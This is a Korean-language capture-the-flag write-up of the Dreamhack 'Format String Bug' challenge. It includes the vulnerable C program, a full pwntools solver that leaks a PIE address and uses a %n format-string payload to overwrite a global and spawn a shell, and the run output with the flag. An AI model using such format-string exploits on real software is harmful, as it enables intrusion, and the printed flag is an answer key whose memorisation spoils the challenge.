# ✏️ Format String Bug
https://dreamhack.io/wargame/challenges/356

## 📄 Vulnerability & Code Analysis
이 문제의 목표는 `changeme`의 값을 `1337`로 바꾸는 것이다.
문제에서 주어진 코드는 다음과 같다.
```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```
`get_string` 함수를 통해 `buf`에 32바이트 입력을 받은 후, `printf`함수의 인자로 직접 사용하므로
Format string bug가 발생한다.

## 🗡️ Exploit / Solver Strategy
### 1. `changeme`의 주소 구하기
```python
main_offset = e.symbols['main']
changeme_offset = e.symbols['changeme']
r.sendline(b'%15$p')

main_leak = int(r.recvline().strip(), 16)
pie_base = main_leak - main_offset
changeme_addr = pie_base + changeme_offset
```
### 2. `changeme`덮어쓰기
```python
fmt = b'%1$1337c%8$n'

payload = fmt.ljust(16, b'A') + p64(changeme_addr)
assert len(payload) <= 0x20

r.sendline(payload)
```

## 💻 Final Payload or Solver
```python
from pwn import *
r = remote('host3.dreamhack.games', 11754)
e = ELF('./fsb_overwrite')

main_offset = e.symbols['main']
changeme_offset = e.symbols['changeme']
r.sendline(b'%15$p')

main_leak = int(r.recvline().strip(), 16)
pie_base = main_leak - main_offset
changeme_addr = pie_base + changeme_offset

fmt = b'%1$1337c%8$n'

payload = fmt.ljust(16, b'A') + p64(changeme_addr)
assert len(payload) <= 0x20

r.sendline(payload)
r.interactive()
```

## 🏳️ cat flag
```bash
(.venv) (base) ➜  fsb_overwrite pypwn fsb_overwrite.py
[/.......] Opening connection to host3.dreamhack.games on port 16561: Trying 23.81.Opening connection to host3.dreamhack.games on port 16561: Do[+] Opening connection to host3.dreamhack.games on port 16561: Done
[*] '/home/daniel/dreamhack/pwn/fsb_overwrite/fsb_overwrite'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Switching to interactive mode
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pAAAA\x1c$
$ cat flag
DH{b283dec57b17112a4e9aa6d5499c0f28}
$
```
